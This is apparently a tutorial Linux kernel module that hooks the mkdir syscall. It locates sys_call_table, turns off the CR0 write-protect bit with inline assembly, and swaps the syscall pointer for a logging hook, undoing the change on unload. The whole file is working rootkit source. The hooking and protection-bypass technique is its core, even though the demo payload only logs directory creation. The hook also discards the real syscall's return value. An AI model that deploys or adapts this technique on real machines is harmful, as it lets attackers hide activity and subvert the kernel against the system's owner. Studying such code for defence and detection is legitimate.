#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Syscall Table Hijacking");
MODULE_VERSION("0.01");

static unsigned long * __sys_call_table;

/* We copy this typedef from include/linux/syscalls.h 
 * Note that asmlinkage is used to prevent GCC from being
 * "helpful" by allocation arguments on the stack */
typedef asmlinkage int (*orig_mkdir_t)(const char __user *pathname, umode_t mode);
orig_mkdir_t orig_mkdir;

/* This is our function hook.
 * Note that we call the real sys_mkdir() function at the end */
asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
{
	printk(KERN_INFO "rootkit: mkdir trying to create directory: %s with mode %d\n", pathname, mode);
	orig_mkdir(pathname, mode);
	return 0;
}

/* The built in linux write_cr0() function stops us from modifying
 * the WP bit, so we write our own instead */
inline void cr0_write(unsigned long cr0)
{
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
 * determines whether read-only pages can be written to. We are modifying
 * the syscall table, so we need to unset it first */
static inline void protect_memory(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	cr0_write(cr0);
}

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Grab the syscall table, and make sure we succeeded */
	__sys_call_table = kallsyms_lookup_name("sys_call_table");

	/* Grab the function pointer to the real sys_mkdir syscall */
	orig_mkdir = (orig_mkdir_t)__sys_call_table[__NR_mkdir];

	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	printk(KERN_DEBUG "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
	printk(KERN_DEBUG "rootkit: mkdir @ 0x%lx\n", orig_mkdir);
	
	unprotect_memory();

	printk(KERN_INFO "rootkit: hooking mkdir syscall\n");
	/* Patch the function pointer to sys_mkdir with our hook instead */
	__sys_call_table[__NR_mkdir] = (unsigned long)hook_mkdir;

	protect_memory();

	return 0;
}

static void __exit rootkit_exit(void)
{
	unprotect_memory();
	
	printk(KERN_INFO "rootkit: restoring mkdir syscall\n");
	__sys_call_table[__NR_mkdir] = (unsigned long)orig_mkdir;
	
	protect_memory();
	
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
